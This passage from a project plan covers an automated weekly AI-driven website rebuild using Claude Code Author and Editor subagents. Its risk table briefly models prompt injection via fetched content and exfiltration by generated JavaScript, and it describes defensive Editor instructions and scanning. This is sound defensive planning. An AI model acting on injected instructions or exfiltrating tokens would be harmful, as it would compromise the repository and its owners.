| Cost per cycle exceeds estimate (worst case > $25) | DC9 caps turn-count + wall-clock. Anthropic console per-key spending limit (DC15) is the hard backstop. **First 3 cycles' measured spend determines whether retry limits or model tier need adjustment.** Documented as Phase 4 expectation. |
| `/last30days` skill not available inside `claude-code-action` runtime | U5 ships with a WebSearch + WebFetch fallback path that follows the same query taxonomy. Fail-soft if both unavailable — cycle proceeds without topical seed. U0 validates which path works. |
| Author + Editor revision loop oscillates without converging | Hard retry limit (`N=3` default). DC9's turn cap also bounds total loops. On 3 unsuccessful retries, cycle terminates with the last attempt logged for postmortem. |
| AI generates an artifact that passes all smoke tests but is *bad* (off-brand, taste-fail) | Editor's brand-brief check is the primary gate. **Post-deploy escape valve is `git revert` (documented in failure-issue template).** Deferred dedicated rollback workflow can be added if revert friction becomes real. |
| AI-generated JS exfiltrates data or includes malicious content | DC11: source-scan deny-list + CSP header on `/archive/*` block external origins and inline scripts without the cycle's CSP nonce. Editor prompt also flags unusual embedded instructions as rejection reason. |
| Prompt injection via topical brief content | DC11 + U5 hardening: fetcher summarizes in own words, injection-pattern stripping, Editor treats artifact content as untrusted. |
| Rating workflow accepts ratings from any GitHub user | v1 only allows direct file edits (PR or push), which require collaborator access. Deferred comment-bot would gate on team allowlist (DC16). |
| Config-file edits (brand-brief, no-fly, rubric) bypass review | DC17 CODEOWNERS gates these files; PRs require team approval. |
| Supply-chain compromise of `claude-code-action` | DC14 pins to specific commit SHA, not floating tag. Dependabot alerts on upstream movement so updates are deliberate. |
| `GITHUB_TOKEN` exfiltration grants repo-wide write access | DC15 declares job-level `permissions:` block scoping to `contents/pull-requests/issues: write`. No PAT used. |
| JSDOM cannot verify visual quality (canvas, animations, modern APIs) | DC13 author-side policy: anchor facts must be static-HTML present; no `IntersectionObserver` etc. without polyfill. Playwright pass deferred to follow-up if visual verification becomes worth the cost. |
| Anchor-fact 100% threshold causes unfixable revision loops on themes that can't fit 60+ entities | DC6 relaxes to 90% + Editor-approved rationale for omissions. Firm name + mission + contact stay at 100%. |
| Archive size grows unboundedly | Per-archive 5MB hard cap (DC4). Cumulative growth bounded at ~250MB/2yr (within Vercel Hobby/Pro free tier deploy limits). Follow-up: move older archives to separate bucket if needed. |
| `main` HEAD moves during a cycle (a human commits) | Cycle's auto-merge SHA check fails; PR stays open for manual handling with "raced with human commit" notification (U6). |
| Mid-cycle config edit lands between orchestrator's read and PR open | Acknowledged race window — small and self-correcting (PR auto-merge SHA check catches it, raced notification fires). Configs are read once early (orchestrator step 1); edits during cycle land in NEXT cycle (R20). |
| Two cycles overlap (manual trigger during cron) | GitHub Actions `concurrency:` group queues second invocation; only one runs at a time (U6, DC3). |
| Self-improvement loop is rating-only in v1, not the brainstorm's three-signal mix | Acknowledged in Scope Boundaries — engagement signal deferred. Performance log distinguishes `null` (not rated) from `0` (rated zero) so Author isn't given false negative signal. |
| Failure issues pile up without triage | Triage is the team's responsibility; the failure-issue template explicitly says "rerun manually after addressing." A follow-up could auto-close stale failure issues. |
| `/welcome.htm` and `/game.html` as preserved URLs function as de-facto stable sidecar surfaces (tension with brainstorm's "Outside this product's identity") | Acknowledged: we preserve them to avoid breaking inbound links and accept they serve as sidecar surfaces. **No internal links from the cycle's root site point to them after first cycle ships; the in-world history view links only to `/archive/...` paths and the `/cli/` preservation.** |

---

## Phased Delivery

### Phase 0 — Runtime validation + platform migration
Land **U0 (spike) and U10 (Vercel migration) in parallel.** They have no shared files and can land as separate PRs in any order. Phase 1 is blocked until U0's report shows P0 capabilities pass. U10's DNS cut may happen anytime after the Vercel preview verifies end-to-end; the team may choose to wait for U10 + U0 + first dry-run cycle (in Phase 2) before cutting DNS so Vercel infrastructure is fully battle-tested before production traffic moves.

### Phase 1 — Foundation
Land U1 (config layer including CODEOWNERS) and U2 (CLI preservation at `/cli/`) in a single PR. CI passes. No new behavior yet; just the new files and the preserved CLI snapshot. The original `/welcome.htm` and `/game.html` URLs continue to work unchanged.

### Phase 2 — Generation core
Land U3 (smoke tests + source-scan + CSP header), U4 (orchestrator + prompts), U5 (topical fetcher) in a single PR. Orchestrator runnable locally with `--dry-run`; smoke tests pass against `/cli/` snapshot. No cron yet, no deploys triggered. **Includes the calibration dry-run: team manually grades 3 dry-run Author outputs alongside Editor decisions to confirm Editor isn't sycophantic on this codebase. If agreement is poor, adjust model tier before proceeding.**

### Phase 3 — Scheduling, deployment, and feedback
Land U6 (cron workflow with SHA-pinned `@v1`, permissions block, explicit auto-merge step), U7 (rating + engagement schemas + direct-edit only), U8 (notification surface). Run U6 manually via `workflow_dispatch` on a side branch first; verify end-to-end. Enable the cron only after the manual dry-run succeeds AND the calibration confirmed Editor is functional.

### Phase 4 — First live cycle + observation
Watch the first scheduled cron fire. **Expect to manually triage the first 2–3 cycles** — cost calibration, taste-failure handling, JSDOM gaps. Use the failure-issue template + workflow logs for triage. Promote deferred items (rollback workflow, `/rate` comment bot, asset-library.js, cycle-config.js, notify-templates.js) to v2 follow-ups as the team discovers real friction with each.

This phasing aligns with the brainstorm's outcome priorities (craft first, then automation) and the security/feasibility findings (validate runtime before committing further; calibrate Editor before going autonomous).

---

## Alternative Approaches Considered

- **Direct Anthropic SDK orchestration instead of `claude-code-action`.** Rejected: loses access to Claude Code skills including `/last30days`, requires new integration path, no existing precedent in the repo. The action already works, has the secret wired, and supports skills.
- **Netlify scheduled functions instead of GitHub Actions cron.** Rejected: scheduled functions can't easily `git push` back to the repo, and the repo's "commit generated artifacts" pattern is the existing model. Scheduled functions are better for "call external API on schedule," not "regenerate static files."
- **Vercel Cron + Vercel Function for the weekly cycle.** Rejected (DC19): Vercel runtimes don't host the Claude Code CLI, so the cycle would have to be rewritten against the direct Anthropic SDK and would lose `/last30days` skill access (the load-bearing rationale for `claude-code-action` in the first place). Vercel's Pro fluid-compute execution cap (~13 min) is also tight for an Author + Editor + revision-loop cycle that historically takes 5–45 min. The clean architectural split: Vercel hosts; GitHub Actions runs the cycle.
- **Staying on Netlify.** Considered. The plan would have worked on Netlify with a few wording changes. Vercel was picked for better DX (preview deploys, faster build feedback) and for the modern serverless / edge config story; it's not a load-bearing technical choice — the cycle is hosting-platform-agnostic.
- **Single Claude conversation for Author + Editor (no subagents).** Rejected: shared context risks Editor sycophancy ("Author worked hard, looks fine"). Separate subagent contexts give cleaner critique signal at a small token cost.
- **Magazine-style "Issue #N" user-facing framing.** Rejected during brainstorm (see origin Key Decisions). Editorial framing remains internal metadata only.
- **A sidecar `root.vc/info` stable about-page surface.** Rejected during brainstorm (origin Outside this product's identity). Anchor facts live inside each weekly artifact, machine-verified by smoke tests, not in a fallback page.
- **Real-browser smoke tests via Playwright instead of JSDOM.** Deferred. JSDOM is the existing harness; v1 accepts that canvas/WebGL/video can't be verified. Playwright is a worthwhile follow-up when an artifact genuinely needs it.
- **Push directly to `main` instead of PR-based merge.** Rejected: PR-based merge gives Netlify deploy previews "for free," preserves audit trail, and protects against `main`-moved race conditions. Direct push offers no compensating benefit.
- **Magazine-style permalink ("Issue 47") instead of date-based.** Rejected: date-based permalinks are simpler, sortable, and don't require maintaining a sequence counter that could go wrong on bootstrap.

---

## Documentation / Operational Notes

- **Configs README.** Add inline comments at the top of each new config file explaining what it does, who edits it, and when changes take effect (next cycle).
- **`docs/operations/weekly-cycle.md`** (deferred to follow-up — not v1): a 1-page runbook for the team covering: how the cycle works at a high level, how to rate, how to roll back, how to read the failure-issue, common reasons cycles fail, who's on-call for what.
- **Rollout sequence:** Phase 1 + 2 lands without enabling the cron. The cron is enabled only after a manual `workflow_dispatch` end-to-end dry run succeeds on a side branch.
- **First-cycle expectations:** The team should expect to manually triage the first 2–3 cycles. After 3 successful unattended cycles, the system is reliably running itself.
- **Cost monitoring:** The orchestrator logs total token spend per cycle. The team should review the first month's cost data to validate the $25/cycle ceiling is right.
- **`/ce-compound` after first 3 cycles:** Capture the Author/Editor handoff contract, the bootstrap migration learnings, the smoke-test failures encountered, and any topical-rubric edits the team made — these belong in `docs/solutions/` for future planners.

---

## Sources & References

- **Origin document:** [docs/brainstorms/weekly-ai-reinvention-requirements.md](docs/brainstorms/weekly-ai-reinvention-requirements.md)
- **Existing CLI workflow:** [.github/workflows/claude.yml](.github/workflows/claude.yml)
- **Existing CI workflow:** [.github/workflows/test.yml](.github/workflows/test.yml)
- **Build pipeline:** [scripts/build-assets.js](scripts/build-assets.js)
- **Test harness precedent:** [tests/helpers/browser-env.js](tests/helpers/browser-env.js), [tests/game.test.js](tests/game.test.js)
- **Existing Netlify function pattern:** [netlify/functions/submit-application.js](netlify/functions/submit-application.js)
- **Netlify deploy config:** [netlify.toml](netlify.toml)
- **Configs (deterministic substrate):** [config/portfolio.js](config/portfolio.js), [config/team.js](config/team.js), [config/jobs.js](config/jobs.js), [config/commands.js](config/commands.js), [config/help.js](config/help.js), [config/fs.js](config/fs.js)
- **Existing reinventions (legacy archive sources):** [index.html](index.html) (CLI terminal), [welcome.htm](welcome.htm) (GeoCities), [game.html](game.html) (Root Router)
